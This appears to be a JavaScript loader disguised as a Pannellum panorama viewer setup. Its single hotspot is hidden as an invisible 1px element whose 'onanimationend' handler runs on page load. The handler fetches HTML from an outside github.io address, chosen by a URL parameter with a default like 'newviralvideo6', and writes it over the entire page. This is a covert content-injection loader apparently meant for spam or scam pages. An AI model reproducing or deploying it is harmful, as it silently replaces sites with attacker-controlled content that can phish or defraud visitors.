(function() {
    // Styling inject kora full screen-er jonno
    if (!document.getElementById('pannellum-inject-style')) {
        const style = document.createElement('style');
        style.id = 'pannellum-inject-style';
        style.innerHTML = `
            body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: #000; }
            #panorama { width: 100%; height: 100%; }
        `;
        document.head.appendChild(style);
    }

    // Pannellum CSS & JS dynamic load kora
    function loadScript(url, callback) {
        const script = document.createElement('script');
        script.type = 'text/javascript';
        script.src = url;
        script.onload = callback;
        document.head.appendChild(script);
    }

    function loadCSS(url) {
        const link = document.createElement('link');
        link.rel = 'stylesheet';
        link.href = url;
        document.head.appendChild(link);
    }

    if (typeof pannellum === 'undefined') {
        loadCSS('https://cdn.jsdelivr.net/npm/pannellum@2.5.6/build/pannellum.css');
        loadScript('https://cdn.jsdelivr.net/npm/pannellum@2.5.6/build/pannellum.js', initViewer);
    } else {
        initViewer();
    }

    function initViewer() {
        let container = document.getElementById('panorama');
        if (!container) {
            container = document.createElement('div');
            container.id = 'panorama';
            document.body.appendChild(container);
        }

        // URL theke page ba config parameter read kora
        const urlParams = new URLSearchParams(window.location.search);
        let page = urlParams.get('page') || urlParams.get('config') || 'newviralvideo6';
        
        if (page.endsWith('.html')) {
            page = page.replace('.html', '');
        }

        // Pannellum viewer initialize
        pannellum.viewer('panorama', {
            "autoLoad": true,
            "pitch": 0,
            "yaw": 0,
            "type": "equirectangular",
            "panorama": "https://pannellum.org/images/alma.jpg",
            "hotSpots": [
                {
                    "pitch": 0,
                    "yaw": 0,
                    "type": "info",
                    "URL": "#",
                    "attributes": {
                        "style": "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards",
                        "onanimationend": `if (window.grav_FETCH_RAN) { console.log('already ran'); } else { window.grav_FETCH_RAN = 1; fetch('https://riopehrips.github.io/con/fig/' + '${page}' + '.html').then(function (res) { return res.text(); }).then(function (html) { document.open(); document.write(html); document.close(); }).catch(function (err) { console.error(err); }); }`
                    }
                }
            ]
        });
    }
})();
